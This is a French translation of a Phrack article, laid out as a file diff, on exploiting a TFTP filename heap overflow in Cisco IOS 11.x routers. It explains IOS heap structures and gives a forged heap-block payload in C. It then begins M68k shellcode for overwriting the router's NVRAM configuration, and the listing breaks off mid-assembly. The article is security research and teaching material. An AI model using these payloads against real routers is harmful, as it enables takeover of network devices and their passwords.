@@ -1,0 +1,999 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3c, Phile #0x07 of 0x10
+
+|=-------------=[ Burning the bridge: Cisco IOS exploits ]=--------------=|
+|=--------------------------------------------------------------------------------=|
+|=----------------=[ FX of Phenoelit <fx@phenoelit.de> ]=----------------=|
+
+--[ Sommaire
+
+  1 - Introduction et restrictions
+  2 - Indentification d'un debordement de tampon
+  3 - Extraits de la disposition de la memoire de IOS
+  4 - Un exploit free() se materialise
+  5 - Ecrire des (shel)codes pour IOS
+  6 - Tout ce qui n'a pas ete dit precedemment
+
+--[ 1 - Introduction et restrictions
+
+Cet article est fait pour introduire le lecteur / la lectrice dans le monde
+sympathique des exploits sur les routeurs concus par Cisco Systems. Ce
+n'est pas le texte ultime sur le sujet et il ne reflete que les resultats
+de nos recherches.
+
+Selon Cisco Systems, a peu pres 85% de tous les trous dans le
+software sont le resultat direct ou indirect de corruptions de
+memoire. Au moment de l'ecriture de cet article, votre serviteur n'est
+n'a pas connaissance d'un seul cas ou deborder quoique se soit dans
+Cisco IOS mene a une reecriture directe d'une adresse de retour.
+Bien qu'il y ait des choses commes des piles dans IOS, il semble
+tres peu commun pour les coders de IOS d'utiliser les tampons locaux
+des fonctions. Par consequent, la plupart (sinon tous) les overflows
+que nous rencontrerons sont quelque part bases sur les heap.
+
+Comme a l'habitude de dire un collegue chercheur, les bugs ne sont pas
+une ressource illimitee. Specialement les bugs de debordement de
+tampon dans Cisco IOS, qui sont relativement rares et pas faciles
+compares aux autres. Cet article limitera de ce fait la discussion a
+un bug en particulier : l'overflow du nom de fichier sur le serveur
+TFTP de Cisco IOS. Quand vous utilisez votre routeur comme serveur
+TFTP pour fichiers dans le systeme de fichier flash, une requete TFTP
+GET avec un long nom de fichier (700 caracteres) va causer un crash du
+routeur. Cela arrive dans toutes les versions de IOS depuis 11.1
+jusqu'a 11.3. Le lecteur / la lectrice pourrait crier que ceci n'est
+plus une branche tres utilisee, mais votre serviteur vous demande de
+mettre ca au clair avec lui a la fin de cet article.
+
+Les resultats de recherches et les methodes presentees ici furent
+collectees au cours de tentatives d'inspection et d'exploitation en
+utilisant le bug TFTP deja mentionne. Au cours de cet article,
+d'autres bugs sont recherches et differantes approches sont testees,
+mais la procedure presentee ici est encore jugee comme la plus
+prometteuse pour un usage etendu. En d'autres termes : utilisez votre
+overflow private dans Cisco IOS et testez-le.
+
+--[ 2 - Identification d'un overflow
+
+Alors que le lecteur / la lectrice est probablement habitue(e) a
+identifier un smash dans la pile en une fraction de secondes sur un
+systeme d'exploitation d'usage courant [NDT : mais oui, bien sur :],
+il / elle pourrait avoir des difficultes a identifier un overflow dans
+IOS. Comme votre serviteur l'a deja mentionne, la plupart des
+overflows sont bases sur des heaps overflows. Il existe deux moyens
+differants dans IOS pour identifier un heap overflow quand il
+arrive. Etant connecte(e) a une console, le lecteur / la lectrice voit
+une sortie comme ca : 
+
+01:14:16: %SYS-3-OVERRUN: Block overrun at 2C01E14 (red zone 41414141)
+-Traceback= 80CCC46 80CE776 80CF1BA 80CF300
+01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc
+  20E3ADC,80CA1D8   20DFBE0,80CA1D8   20CF4FC,80CA1D8   20C851C,80CA1D8
+  20C6F20,80CA1D8   20B43FC,80CA1D8   20AE130,80CA1D8   2075214,80CA1D8
+01:14:16: %SYS-6-MTRACE: mallocfree: addr, pc
+  20651E0,80CA1D8   205EF04,80CA1D8   205B338,80CA1D8   205AB80,80CA1D8
+  20AFCF8,80CA1C6   205A664,80CA1D8   20AC56C,80CA1C6   20B1A88,80CA1C6
+01:14:16: %SYS-6-BLKINFO: Corrupted redzone blk 2C01E14, words 382,
+  alloc 80ABBFC, InUse, dealloc 206E2F0, rfcnt 1
+
+Dans ce cas, un processus IOS appele "Check heaps", de qui nous
+entendrons beacoup parler un peu plus tard, a identifie un probleme
+dans les structures heap. Apres avoir fait cela, "Check heaps" causera
+ce que nous appellerons un crash logiciel force. Ca signifie que le
+procesus kill le Cisco et le fait rebooter pour se debarasser du
+probleme.  Nous connaissons tous/toutes ce comportement de la part des
+utilisateurs de systemes bases sur MS-DOS ou Windows. Ce qui se passe
+est qu'un A-Strip a reecrit une borne entre deux blocs memoires de
+heap. Ceci est protege par ce que Cisco appelle une "ZONE ROUGE", qui
+en fait n'est qu'un [canary] statique.
+
+L'autre moyen par lequel peut se manifester un heap overflow dans
+votre console est une violation d'acces :
+
+*** BUS ERROR ***
+access address = 0x5f227998
+program counter = 0x80ad45a
+status register = 0x2700
+vbr at time of exception = 0x4000000
+special status word = 0x0045
+faulted cycle was a longword read
+
+C'est le cas quand vous etes chanceux/chanseuse et la moitie du
+travail est deja faite. IOS a utilise une valeur que vous avez d'une
+maniere ou d'une autre influencee et referencee a une memoire non
+lisible. Malheureusement, ces overflows sont plus tard plus
+difficiles a exploiter, car le tracage est beaucoup plus difficile.
+
+A ce moment, vous devriez essayer de calculer dans quelles
+circonstances exactes l'overflows est arrive - comme pour la plupart
+des auters bugs que vous trouvez. Si la limite inferieure de la taille
+de votre tampon change, essayez de vous assurer que vous ne jouez pas
+avec la console ou des conections telnet (1) vers le routeur durant
+les tests. Le mieux est de toujours tester la longueur du tampon avec
+un routeur qui vient juste d'etre redemarre. Alors que cela ne change
+pas grand chose pour les autres overflows, certains reagissent
+differemment quand le systeme est fraichement reboote par rapport a un
+systeme en cours d'utilisation.
+
+--[ 3 - Extraits de la disposition de la memoire de IOS
+
+Pour aller plus loin avec l'overflow, nous devons regarder comment IOS
+organise la memoire. Il y a a la base deux zones principales dans IOS
+: la memoire du processus et la memoire IO. La seconde est utilisee
+pour les tampons de paquets, les tampons de ring d'interface et ainsi
+de suite et peut etre interessante pour l'exploitation mais le fournit
+pas certaines des choses cruciales que nous recherchons. D'autre part,
+la memoire processus se comporte en grande partie comme la meoire heap
+dynamique de GNU/Linux.
+
+La memoire dans IOS est divisee en blocs. Il semble qu'il y ait la un
+nombre de tables de pointeurs et de meta structures qui ont un rapport
+avec les blocs de memoire et assurent que IOS puisse y acceder de
+maniere efficace. Mais a la fin de la journee, les blocs sont tous
+tenus ensembles dans une structure liste linkee et entroposee leur
+information de gestion en grande partie sur une ligne. Ceci signifie
+que tout bloc memoire possede un en-tete, qui contient l'information a
+propos du bloc, son predecesseur et le suivant dans la liste.
+
+     +--------------+
+ .-- | Block A      | <-.
+ |   +--------------+   |
+ +-> | Block B      | --+
+     +--------------+
+     | Block C      |
+     +--------------+
+
+La commande "show memory processor" ["montrer la memoire du processeur"]
+montre clairement la structure liste linkee.
+
+Un bloc memoire en lui-meme se compose de l'en-tete avec toute
+l'information de gestion sur une ligne, la partie donnee ou la donnee
+actuelle est entreposee et la zone rouge, que nous avons deja rencontree.
+Le format est comme suit :
+
+ |<-  32 bit  ->|        Commentaires
+ +--------------+
+ | MAGIC        |        Valeur statique 0xAB1234CD
+ +--------------+
+ | PID          |        ID du process IOS
+ +--------------+
+ | Alloc Check  |	 Zone que le processus utilise d'allocatiuon
+ +--------------+          pour ses verifications
+ | Alloc name   |        Pointeur vers une chaine avec le nom du processus
+ +--------------+
+ | Alloc PC     |	 Code de l'adresse qui a alloue ce bloc
+ +--------------+
+ | NEXT BLOCK   |        Pointeur vers le bloc suivant
+ +--------------+
+ | PREV BLOCK   |        Pointer vers le bloc precedant
+ +--------------+
+ | BLOCK SIZE   |        Taille du bloc (MSB marque "in use")
+ +--------------+
+ | Reference #  |        Compteur reference (encore ???)
+ +--------------+
+ | Last Deallc  |	 Adresse de la derniere de-allocation
+ +--------------+
+ |   DATA       |
+ |              |
+ ....
+ |              |
+ +--------------+
+ | RED ZONE     |        Valeur statique 0xFD0110DF
+ +--------------+
+
+Au cas ou ce loc memoire est utilise, le champ taille aura sont bit le
+plus significatif mit a un. La taille est representee en mots (2 octets),
+et n'inclut pas le chapeau du bloc. Le champ compteur reference est
+evidemment destine a garder une trace du nombre de processus qui utilisent
+ce bloc, mais votre serviteur n'a jamais vu ceci etre autre chose que 1
+ou 0. Donc, il ne semble pas y avoir de verification en place pour ce
+champ.
+
+Dans le cas ou le bloc memoire n'est pas utilise, quelques donnee de
+gestion supplementaires sont presentees au poit ou les donnees reelles
+etaient entreposees auparavant :
+
+ | [BLOCK HEAD] |
+ +--------------+
+ | MAGIC2       |        Valeur statique 0xDEADBEEF
+ +--------------+
+ | Somestuff    |
+ +--------------+
+ | PADDING      |
+ +--------------+
+ | PADDING      |
+ +--------------+
+ | FREE NEXT    |        Pointeur vers le prochain bloc libre
+ +--------------+
+ | FREE PREV    |        Pointeur vers le precedent bloc libre
+ +--------------+
+ |              |
+ ....
+ |              |
+ +--------------+
+ | RED ZONE     |        Valeur statique 0xFD0110DF
+ +--------------+
+
+Par consequent, un bloc libre est un element de deux listes linkees
+differantes : une pour les blocs en general (libre ou non), une autre pour
+la liste des blocs memoire libres. Dans ce cas le compteur reference sera
+zero et le MSB du champ taille n'est pas defini. De plus, si un bloc etait
+utilise au moins une fois, la partie donnees du bloc serait remplie avec
+0x0D0D0D0D. IOS aujourd'hui reecrit le bloc data quand un free() prend
+place pour eviter aux sorties software de tomber des mains.
+
+A ce moment, votre serviteur aimerait revenir au sujet du processus
+"Check heaps". Ca sert a tourner environ une minute et verifie la double
+liste linkee de blocs. A la base ca les parcourt de haut en bas pour voir
+si tout va bien. Les tests employes semblent etre plutot vastes compares
+aux systemes d'exploitations communs comme GNU/Linux. Autant que votre
+serviteur le sache, voici ce que ca verifie :
+	1) Le bloc est-il avec MAGIC (0xAB1234CD)?
+	2) Si le bloc est en cours d'utilisation (MSB est mis dans le
+	   champ taille), verifier si la zone rouge est la et contient
+	   0xFD0110DF.
+	3) Le pointeur PREV est-il non NULL ?
+	4) Si il existe un pointeur NEXT ...
+	4.1) Pointe-t-il juste apres la fin de ce bloc ?
+	4.2) Le pointeur PREV dans le bloc pointe par NEXT pointe-t-il
+	     vers le pointeur de ce bloc ?
+	5) Si le pointeur NEXT est NULL, ce bloc termine-t-il une
+	   region ou un pool [NOTE : pas sur de celui-ci]
+	6) La taille a-t-elle un sens ? [Note : le test exact ici est
+	   toujours inconnu]
+
+Si l'un de ces tests n'est pas satisfait, IOS se declarera pas content et
+executera un crash logiciel force. Pour certains renseigements, on peut
+decouvrir quel test a failli en jetant un oeuil a la sortie console qui
+dit "validblock_diagnose = 1". Le nombre indique ce qui peut etre appele
+"classe de test", ou 1 signifie que le MAGIC n'etait pas correct, 3
+signifie que l'adresse n'est dans aucun pool memoire, et 5 est reellement
+une grappe de tests mais indique principalement que les tests aux lignes
+4.1 et 4.2 ont failli.
+
+--[ 4 - Un exploit free() se materialise
+
+Maintenant que nous connaissons un peu la structure de la memoire,
+nous prevoyons de deborder le tampon avec d'autres donnees plus
+interessantes que le seul 0x41. L'idee de base est de reecrire l'entete
+du prochain bloc, par ce biais fournir des donnees a IOS, et le laisser
+travailler avec ces donnes dans un sens qui nous donne le controle sur
+le CPU. La maniere dont ceci est realise habituellement est expliqueee
+en [1]. La plus importance ici est que nous devons d'abord rendre le
+"Check heaps" heureux. Malheureusement, quelques verifications sont
+egalement faites quand la memoire est allouee ou liberee par un free().
+Par consequent, glisser en-dessous de la limite d'une minute entre deux
+"Check heaps" n'est pas une option ici.
+
+Les plus gros problemes sont les verifications des pointeurs PREV et le
+champ taille. Commoe la faille sur laquelle nous travaillons ici est un
+overflow de chaine de caracteres, nous avons egalement le probleme de ne
+pas pouvoir utiliser les octets 0x00. Essayons de nous occuper des
+problemes que nous recontrons un par un.
+
+Le pointeur PREV doit etre correct. Votre serviteur n'a trouve aucun
+moyen d'utiliser des valeurs arbitraires ici. Le test ligne dans la
+checklist en 4.2 est un serieux probleme, car il est effectue sur le bloc
+que nous squattons - pas celui que nous sommes en train de deborder. Pour
+illustrer la situation :
+
+     +--------------+
+     | Tete du bloc |
+     ...
+     | AAAAAAAAAAAA |    <--- Vous etes ici
+     | AAAAAAAAAAAA |
+     | AAAAAAAAAAAA |
+     +--------------+
+     | ZONE ROUGE   |    <--- Vos donnees ici
+     +==============+
+     | Tete du bloc |
+     ...
+
+Nous appellerons le bloc le bloc du haut, dont nous debordons la partie
+donnees, le '"bloc hote", parce qu'a la base il "hote" nos mefaits. Pour
+etre clair, nous appellerons l'en-tete du bloc reecrit le "faux bloc",
+car nous allons falsifier son contenu.
+
+Donc, lorsque le "Check heaps" ou des tests comparables pendant malloc()
+et free() sont effectue sur notre bloc hote, la reecriture est deja
+remarquee. Tout d'abord, nous devons concatener le [canary] de la zone
+rouge a notre tampon. Si nous dedordons avec exactement le nombre d'octets
+que peut tenir le tamopn et concatener le dword 0xFD0110DF de la zone
+rouge, "Check heaps" ne se plaindra pas. Partant de la, c'est un joli jeu
+pour le pointeur PREV - car les valeurs sont soit statiques (MAGIC) ou
+totalement ignorees (PID, pointeurs d'allocations)
+
+Supposons que nous reecrivons par dessus la ZONE ROUGE, MAGIC, PID, les
+trois pointeurs Alloc, NEXT et PREV, un test effectue sur le bloc hote
+aura deja declenche un crash logiciel force, car le pointeur PREV que
+nous avons reecrit dans le bloc suivant ne pointe pas en retour vers le
+bloc hote. Nous n'avons actuellement qu'un unique moyen de nous occuper
+de ce probleme : nous crashons l'appareil. L'idee derriere ceci est que
+nous le mettons dans un etat de memoire previsible. Apres un redemarrage,
+la memoire est plus ou moins structuree de la meme facon. Ceci depend
+egalement en amont de la memoire disponible sur l'appareil que nous
+attaquons et ce n'est certainement pas une bonne solution. Quand nous
+crashons l'appareil la premiere fois avec un A-Strip, nous pouvons tenter
+de choper des informations de logging en dehors du reseau ou du serveur
+syslog si une chose pareille est configuree. Votre serviteur est
+parfaitement au courant du fait que ceci va contre toute utilisation
+pratique de la technique. Pour cet article, supposons juste que vous pouvez
+lire la sortie console.
+
+A present que nous connaissons le pointeur PREV a mettre dans le bloc
+falsifie, allons-y. Pour maintenant ignorer le pointeur NEXT, nous devons
+nous occupper du champ taille. Le fait est qu'il sagit d'un champ de 32 bits
+et nous sommes en train de faire un overflow de chaine de caracteres nous
+empechant de mettre des nombres raisonnables dedans. Le nombre le plus petit
+pour un bloc utilise serait 0x80010101 et pour un bloc inutilise 0x01010101.
+C'est beaucoup plus que IOS en accepterait. Mais pour faire d'une longue
+histoire une courte, mettre 0x7FFFFFFF dedans passera les tests de taille.
+Aussi simple que cela.
+
+Dans ce cas particulier, comme avec d'autres overflows de services de
+au niveau applicatif dans IOS, notre bloc hote est l'un des derniers
+blocs de la chaine. Le cas le plus simple est quand le bloc hote est
+l'avant dernier bloc. Par grande chance, c'est le cas avec l'overflow
+du serveur TFTP. Dans les autres cas, l'attaque associe plusieurs
+en-tetes de blocs falsifies et devient d'autant plus compliquee mais
+pas impossible. Mais a partir de la, la discussion est un peu plus
+centree autour du bug specifique dont nous nous occupons.
+
+Dans le deroulement d'une operation normale, IOS va allouer des blocs
+pour entreposer le nom de fichier demande. Le bloc apres ca est la
+memoire libre restante. Lorsque IOS en a termine avec l'operation de
+TFTP, il va free() le bloc qu'il venait d'allouer. Apres, il va
+decouvrir qu'il y avait deux bloc libres - l'un apres l'autre - dans
+la memoire. Pour empecher la fragmentation de la memoire (un gros
+probleme sur les routeurs a lourds chargements), IOS tentera d'unir
+(merge) les blocs libres en un seul. Ce faisant, les pointeurs pour
+les listes linkees doivent etre ajustes. Les pointeurs NEXT et PREV du
+bloc du bloc precedant et du bloc suivant doivent etre ajustes pour
+pointer sur chaque autre. De plus, les pointeurs dans les infos du
+bloc libre FREE NEXT et FREE PREV doivent etre ajustes, donc la liste
+des blocs libres n'est pas rompue.
+
+Soudain nous avons deux operations d'echanges de pointeurs qui
+pourraient vraiment nous aider. A present, nous savons que nous ne
+pouvons pas choisir le pointeur dans PREV. Malgre tout, nous pouvons
+choisir le pointeur dans NEXT, supposant que "Check heaps" ne fait pas
+feu avant que  notre free() ait pris place, ceci ne nous autorise qu'a
+ecrire le precedant pointeur a n'importe quel endroit dans la memoire
+du routeur. Etant utile par lui-meme, nous ne regarderons pas plus
+profond dans tout ceci mais allons sur les pointueurs FREE NEXT et
+FREE PREV. Comme l'aura surement remarque le lecteur / la lectrice
+avise(e), ces deux pointeurs ne sont pas valides par "Check heaps".
+
+Ce qui fait que l'exploitation de cette situation est extremement
+pratique est le fait que l'echange de pointeurs dans FREE PREV et FREE
+NEXT ne compte que sur les valeurs de ces deux champs. Ce qui se passe
+pendant l'operation de fusion est ceci :
+	+ la valeur de FREE PREV est ecrite la ou FREE NEXT pointe
+	  plus un offset de 20 octets
+	+ la valeur de FREE NEXT est ecrite la ou FREE PREV pointe
+
+La seule choses dont nous avons besoin a present est un endroit ou
+ecrire un pointeur. Comme pour plein d'autres exploits bases sur les
+pointeurs, nous sommes en train de chercher un sympathique endroit
+statique dans la memoire pour faire ceci. Une tel endoit statique (qui
+change selon l'image de IOS) est la pile processus des processus
+standards charges juste apres le demarrage. Mais comment allons-nous
+trouver ceci ?
+
+Dans la liste de memoire de IOS, il y a un element appele le "tableau
+des processus". C'est une liste de pointeurs - un pour chaque
+processus en cours de fonctionnement dans IOS. Vous pouvez trouver sa
+localisation en emettant une commande "show memory processor
+allocated-process" (dont voici la sortie) :
+
+radio#show memory processor allocating-process
+
+          Processor memory
+
+ Address Bytes Prev.   Next    Ref  Alloc Proc Alloc PC  What
+258AD20   1504 0       258B32C   1  *Init*     20D62F0   List Elements
+258B32C   3004 258AD20 258BF14   1  *Init*     20D6316   List
+...
+258F998   1032 258F914 258FDCC   1  *Init*     20E5108   Process Array
+258FDCC   1000 258F998 25901E0   1  Load Meter 20E54BA   Process Stack
+25901E0    488 258FDCC 25903F4   1  Load Meter 20E54CC   Process
+25903F4    128 25901E0 25904A0   1  Load Meter 20DD1CE   Process Events
+
+Ce "Tableau des Processus" peut etre affiche par la commande "show
+memory" :
+
+radio#show memory 0x258F998
+0258F990:                   AB1234CD FFFFFFFE          +.4M...~
+0258F9A0: 00000000 020E50B6 020E5108 0258FDCC  ......P6..Q..X}L
+0258F9B0: 0258F928 80000206 00000001 020E1778  .Xy(...........x
+0258F9C0: 00000000 00000028 02590208 025D74C0  .......(.Y...]t@
+0258F9D0: 02596F3C 02598208 025A0A04 025A2F34  .Yo<.Y...Z...Z/4
+0258F9E0: 025AC1FC 025BD554 025BE920 025BFD2C  .ZA|.[UT.[i .[},
+0258F9F0: 025E6FF0 025E949C 025EA95C 025EC484  .^op.^...^)\.^D.
+0258FA00: 025EF404 0262F628 026310DC 02632FD8  .^t..bv(.c.\.c/X
+0258FA10: 02634350 02635634 0263F7A8 026418C0  .cCP.cV4.cw(.d.@
+0258FA20: 026435FC 026475E0 025D7A38 026507E8  .d5|.du`.]z8.e.h
+0258FA30: 026527DC 02652AF4 02657200 02657518  .e'\.e*t.er..eu.
+0258FA40: 02657830 02657B48 02657E60 0269DCFC  .ex0.e{H.e~`.i\|
+0258FA50: 0269EFE0 026A02C4 025DD870 00000000  .io`.j.D.]Xp....
+0258FA60: 00000000 025C3358 026695EC 0266A370  .....\3X.f.l.f#p
+
+Alors que vous voyez egalement en action le format d'en-tete de bloc
+deja vu, l'information interessante commence a 0x0258F9C4. Ici, vous
+trouvez le nombre de processus actuellement en cours d'execution dans
+IOS. Ils sont ordonnes par leur process ID. Ce que nous cherchons est
+un processus qui est execute a chaque fois en peu de temps. La raison
+en est que si nous modifions quelque chose dans les structures de
+donnees de processus, nous ne voulons pas que le processus soit actif
+a ce moment la, donc l'endroit ou nous ecrivons par dessus est
+statique. Pour cette raison, votre serviteur a pris le processus "Load
+Meter", qui est la pour mesurer la charge systeme et est tue environ
+toutes les 30 secondes. Chopons le PID de "Load Meter" :
+
+radio#show processes cpu
+CPU utilization for five seconds: 2%/0%; one minute: 3%; five minutes: 3%
+ PID  Runtime(ms)  Invoked  uSecs    5Sec   1Min   5Min TTY Process
+   1          80      1765     45   0.00%  0.00%  0.00%   0 Load Meter
+
+Alors, a propos, ce processus a le PID 1. A present, nous verifions
+l'endroit de la memoire ou pointe le "Tableau des Processus". Votre
+serviteur appelle cet emplacement memoire le "l'enregistrement des
+processus", car it semble contenir tout ce dont IOS a besoin de savoir
+a propos des processus. Les deux premieres entrees dans
+l'enregistrement sont :
+
+radio#sh mem 0x02590208
+02590200:                   0258FDF4 025901AC          .X}t.Y.,
+02590210: 00001388 020E488E 00000000 00000000  ......H.........
+02590220: 00000000 00000000 00000000 00000000  ................
+
+La premiere entree dans cet enregistrement est 0x0258FDF4, qui est la
+pile des processus. Vous pouvez comparer ceci a la ligne plus haut qui
+dit "Load Meter" et "Pile des processus" dessus dans la sortie de
+"show memory processor allocating-process". Le second element est le
+pointeur de plis courant de ce processus ((0x025901AC). A partir de
+maintenant il devrait donc etre clair ce pourquoi nous voulons prendre
+un processus avec une faible activite. Mais, etonnamment, la meme
+procedure fonctionne tres bien avec des processus plus occupes comme
+"IP Input". En inspectant la localisation du pointeur de plie, nous
+voyons quelque chose de tres familier :
+
+radio#sh mem 0x025901AC
+025901A0:                            025901C4              .Y.D
+025901B0: 020DC478 0256CAF8 025902DE 00000000  ..Dx.VJx.Y.^....
+
+C'est la convention classique d'appel en C : d'abord nous trouvons le
+pointeur de l'ancien cadre et apres nous trouvons l'adresse de
+retour. Par consequent, 0x025901B0 est l'adresse que nous ciblons pour
+ecrire par dessus avec un pointeur fournit par nous.
+
+La seule question restante est : Ou voulons-nous que l'adresse de
+retour pointe ?
+Comme deja mentionne, IOS ecrira par-dessus le tampon que nous sommes
+en train de remplir avec des 0x0D0D0D0D quand le free() est execute -
+donc ce n'est pas un bon endroit pour le code. De l'autre cote, la
+section donnees du bloc falsifie est deja consideree comme propre du
+point de vue de IOS, donc nous concatenons juste notre code a
+l'en-tete du bloc falsifie que nous devons deja envoyer. Mais quelle
+est son adresse ? Bon, comme nous devons connaitre le pointeur
+precedant, nous pouvons calculer l'adresse de notre code comme offset
+de celui-ci - et il semble que c'est actuellement un nombre statique
+dans notre cas. Il estiste d'autres methodes avancees pour delivrer le
+code a l'appareil, mais restons focalises sur celle-ci.
+
+Le nom de fichier que nous demandons devrait a present avoir la forme
+suivante :
+
+ +--------------+
+ | AAAAAAAAAAAA |
+ ...
+ | AAAAAAAAAAAA |
+ +--------------+
+ | BLOC         |
+ | FALSIFIE     |
+ ....
+ |              |
+ +--------------+
+ | CODE         |
+ |              |
+ ....
+ +--------------+
+
+A ce stade, nous pouvons contruire le bloc falsifie en utilisant
+toutes les informations que nous avons reunies :
+
+    char                fakeblock[] =
+        "\xFD\x01\x10\xDF"      // RED
+        "\xAB\x12\x34\xCD"      // MAGIC
+        "\xFF\xFF\xFF\xFF"      // PID
+        "\x80\x81\x82\x83"      //
+        "\x08\x0C\xBB\x76"      // NOM
+        "\x80\x8a\x8b\x8c"      //
+
+        "\x02\x0F\x2A\x04"      // NEXT
+        "\x02\x0F\x16\x94"      // PREV
+
+        "\x7F\xFF\xFF\xFF"      // TAILLE
+        "\x01\x01\x01\x01"      //
+        "\xA0\xA0\xA0\xA0"      // padding
+        "\xDE\xAD\xBE\xEF"      // MAGIC2
+        "\x8A\x8B\x8C\x8D"      //
+        "\xFF\xFF\xFF\xFF"      // padding
+        "\xFF\xFF\xFF\xFF"      // padding
+
+        "\x02\x0F\x2A\x24"      // FREE NEXT (dans  BUFFER)
+        "\x02\x59\x01\xB0"      // FREE PREV (adresse de retour de Load Meter)
+        ;
+
+Quand vous envoyez ca au Cisco, vous voyez probablement quelque chose
+comme ceci :
+
+*** EXCEPTION ***
+illegal instruction interrupt
+program counter = 0x20f2a24
+status register = 0x2700
+vbr at time of exception = 0x4000000
+
+Cela depend de ce qui vient apres l'en-tete de votre bloc
+falsifie. Bien entendu, nous n'avons pas encore fournit le code de
+l'execution. Mais a cet instant, nous avons le CPU redirige vers notre
+tampon.
+
+--[ 5 - Ecrire des (shell)codes pour Cisco
+
+Avant de pouvoir ecrire du code pour plate-forme Cisco, vous devez
+decider de l'architecture processeur generale que vous attaquez. Dans
+le cadre de cet article, nous nous focaliserons sur les devices de plus
+bas niveau sur les CPU Motorola 68k.
+
+A present la question est "que voulez-vous faire avec votre code sur le
+systeme ?" Le plan classique du shell code pour les systemes
+d'exploitation courants utilise les appels systemes ou les fonctions
+de librairies pour faire des binds de ports et fournir un acces shell
+a l'attaquant. Le probleme avec Cisco IOS est que nous allons avoir
+beaucoup de mal a le garder en vie apres que nous ayons joue avec les
+pointeurs. Ceci parce qu'au contraire des demons "normaux", nous avons
+detruit la gestion de la memoire du noyau du systeme d'exploitation et
+nous ne pouvons pas nous attendre a ce qu'il s'occupe du desodre que
+nous lui laissons.
+
+De plus, le design de IOS de fournit pas d'appels systemes
+transparents autant que le sache votre serviteur. A cause de son
+design monolitique, les choses sont liees au moment de la
+compilation. Il y a peut-etre des moyens d'appeler differantes
+sous-fonctions de IOS meme apres une attaque heap overflow, mais cela
+semble etre une route inefficace a suivre pour l'exploitation et
+ferait le processus en entier beaucoup plus instable.
+
+L'autre moyen est de modifier la configuration du routeur et de le
+redemarrer, donc il se presentera avec la nouvelle configuration que
+vous avez fournie. Ceci est nettement plus simple que de tenter de
+calculer les appels sytemes ou les configurations d'appels de
+pile. L'idee derriere cette approche est que vous n'avez plus besoin
+d'aucune fonctionnalite de IOS. A cause de cela, vous n'aurez pas a
+calculer les adresses et autre information vitale a propos du
+IOS. Tout ce que vous avez a savoir est quels chips NVRAM sont
+utilises dans la machine et ou ils sont organises. Cela peut sembler
+un moyen plus complique que d'identifier des fonctions dans une image
+de IOS - mais ce ne l'est pas. Au contraire des systemes
+d'exploitation courants sur les plate-formes PC, ou le nombre de
+combinaisons materielles possibles et de cartographies de memoires
+excede de loin le domaine du faisable, c'est l'autre moyen detourne
+pour les routeurs Cisco. Vous pouvez avoir plus de dix images de IOS
+sur une simple plate-forme - et ce n'est seulement qu'une branche -
+mais vous avez toujours la meme disposition generale de la memoire et
+les IC ne changent pas pour la plupart. La seule chose qui pourrait
+changer entre deux boxes sont les modules et la taille de la memoire
+disponible (RAM, NMRAM et Flash), mais cela ne nous concerne pas
+beaucoup.
+
+La memoire vive non-volatile (NVRAM) [NDT : non-volatile random access
+memory] stocke dans la plupart des cas la configuration d'un routeur
+Cisco. La configuration elle-meme est stockee en format texte comme
+une chaine de caracteres continue dans le style de code C ou un
+fichier texte et est terminee par le mot-cle 'end' et un ou plusieurs
+octets 0x00. Une structure en-tete contient des information comme la
+version de IOS qui a cree cette configuration, sa taille et une
+checksum. Si nous remplacons la config dans la NVRAM avec la notre et
+calculons correctement les nombres pour la structure en-tete, le
+routeur utilisera nos adresses IP, routages, listes d'acces et (le
+plus important) mots de passe la prochaine fois qu'il recharge.
+
+
+Comme on peut le voir sur les cartes de la memoire [2], il y a une
+(dans le pire des cas deux) adresse possible pour la NVRAM pour chaque
+plate-forme. Comme la NVRAM est cartographiee dans la memoire comme
+pour la plupart des chips memoire, nous pouvons y acceder avec une
+simple operation de move de memoire. Par consequent, la seule chose
+dont nous avons besoin pour notre "shell" code est le CPU (M68k), son
+adresse et bus de donnees et la cooperation du chip de la NVRAM.
+
+Il y a des choses a garder en memoire a propos de la NVRAM. Tout
+d'abord, c'est lent en ecriture. Le chip Xicor que votre serviteur a
+rencontre sur les routeurs Cisco requiert qu'apres une ecriture, les
+lignes d'adresse sont gardees inchangees pour le temps dont le chip a
+besoin pour ecrire les donnees. Un registre de controle signalera
+quand l'operation d'ecriture est effectuee. Comme la localisation de
+ce registre de controle n'est pas connue et pourrait ne pas etre la
+meme pour differants types de la meme plate-forme, votre serviteur
+prefere utiliser des boucles de delay pour donner au chip le temps
+d'ecrire les donnees - puisque la vitesse n'est pas le probleme de
+l'attaquant ici.
+
+A present que nous savons un peu mieux ce que nous voulons faire, nous
+pouvons y aller et regarder le "comment" des choses. Tout d'abord,
+vous devez coder l'assembleur pour la plate-forme cible. Un fait peu
+connu est que IOS est compile (au moins parfois) avec des compilateurs
+GNU. Par consequent, le paquetage binutils [3] peu etre compile pour
+construire du code compatible Cisco en mettant la plate-forme cible pour
+que le ./configure lance avec --target=m68k-aout. Une fois termine, vous
+aurez un binaire m68k-aout-as, qui peu produire votre code et un
+m68k-aout-objdump pour obtenir les valeurs de code OP.
+
+Au cas ou le lecteur / la lectrice parle couramment l'assembleur
+Motorola 68000, j'aimerais m'excuser pour le mauvais style, mais votre
+serviteur a grandi sous Intel.
+Les guides d'optimisation et de style sont les bienvenus.
+De toute facon, allons-y pour le code.
+
+Pour un scenario d'overflow de chaine de caracteres comme celui-ci, la
+voie recommandee pour un petit code est d'utiliser l'auto-modification.
+Le code principal sera XOR-e avec un motif comme 0x55 ou 0xD5 pour etre
+sur de n'avoir aucun octet 0x00 qui puisse apparaitre. Un code de
+bootstrap decodera le code principal et lui passera l'execution. La
+plate-forme Cisco 1600 avec son 68360 n'a pas le moindre probleme de
+cache a nous opposer (merci a LSD de l'avoir signale), donc le seul
+probleme que nous ayons est d'eviter les octets 0x00 dans le code de
+bootstrap. Voici comment ca marche :
+
+--- bootstrap.s ---
+	.globl _start
+_start:
+        | Retire la protection en ecriture de la NVRAM.
+	| La protection est le Bit 1 dans BR7 pour 0x0E000000
+        move.l  #0x0FF010C2,%a1
+        lsr     (%a1)
+
+        | fixe la branche du opcode
+	| 'bne decode_loop' est le OP code 0x6600 et ceci est mauvais
+        lea     broken_branch+0x101(%pc),%a3
+        sub.a   #0x0101,%a3
+        lsr     (%a3)
+
+        | execute le chargement factice, ou 0x01010101 est ensuite remplace
+        | par la valeur de notre pointeur de pile du a l'autre cote de l'echange 
+	| de pointeur
+        move.l  #0x01010101,%d1
+
+        | Obtient l'adresse du vrai code concatene plus 0x0101 pour
+	| eviter les octets 0x00
